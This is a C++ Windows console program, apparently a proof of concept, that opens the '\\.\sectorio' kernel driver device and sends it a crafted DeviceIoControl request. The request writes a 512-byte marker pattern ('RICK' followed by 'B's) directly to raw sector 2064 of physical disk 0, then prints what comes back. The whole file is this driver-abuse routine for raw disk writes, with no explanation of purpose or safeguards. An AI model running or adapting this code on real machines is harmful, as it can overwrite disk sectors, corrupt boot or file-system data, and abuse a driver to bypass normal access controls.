// ConsoleApplication6.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "Windows.h"
#include <shlwapi.h>
#include <io.h>
#include <stdlib.h>
#include <tchar.h>
#include <Winternl.h>

#define CTL_CODE( DeviceType, Function, Method, Access ) (                 \
    ((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method) \
)

#define STATUS_SUCCESS					((NTSTATUS)0x00000000L)

int main()
{
	typedef struct _DISK_LOCATION {
		BOOLEAN		bIsRawDiskObj = TRUE;
		DWORD		dwDiskOrdinal = 0x0;
		ULONGLONG	ullSectorNum = 2064; //2064
	} DISK_LOCATION, * PDISK_LOCATION;

	HANDLE hDevice;
	char drvFullPath[MAX_PATH + 1];
	char *filePart;
	char sysDir[MAX_PATH + 1];

	hDevice = CreateFileA("\\\\.\\sectorio", GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
			NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDevice == INVALID_HANDLE_VALUE)
		{
			printf("Error loading kernel support driver!\nMake sure you are running this as Administrator.\n");
		}
	

	DWORD	dwStatus, Size = 525, Bytes;
	PVOID	pMem = NULL;
	
	char data[525];

	DISK_LOCATION write_loc;
	char *endptr;

	char sector_bytes[512];
	memset(sector_bytes, 'B', 512);



	sector_bytes[0] = 'R';
	sector_bytes[1] = 'I';
	sector_bytes[2] = 'C';
	sector_bytes[3] = 'K';

	memcpy(&data, &write_loc.bIsRawDiskObj, sizeof(write_loc.bIsRawDiskObj));
	memcpy(&data[0 + sizeof(write_loc.bIsRawDiskObj)], &write_loc.dwDiskOrdinal, sizeof(write_loc.dwDiskOrdinal));
	memcpy(&data[0 + sizeof(write_loc.bIsRawDiskObj) + sizeof(write_loc.dwDiskOrdinal)], &write_loc.ullSectorNum, sizeof(write_loc.ullSectorNum));
	memcpy(&data[0 + sizeof(write_loc.bIsRawDiskObj) + sizeof(write_loc.dwDiskOrdinal) + sizeof(write_loc.ullSectorNum)], sector_bytes, 512);


	printf("%d", sizeof(data));

	int i;

	//for (i = 0; i < 525; ++i)
	//	printf("%02X", data[i]);

	BOOL test;

	char out[512];

	test = DeviceIoControl(hDevice, CTL_CODE(0x8000, 0x801, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS), data, Size, out, 512, &Bytes, NULL);
	
	printf("Boolean: %d", test);
	dwStatus = GetLastError();
	printf("DeviceIoControl Failed and error code is %d\n", dwStatus);

	for (i = 0; i < 512; ++i)
		printf("%c", ((char *)out)[i]);

    return 0;
}

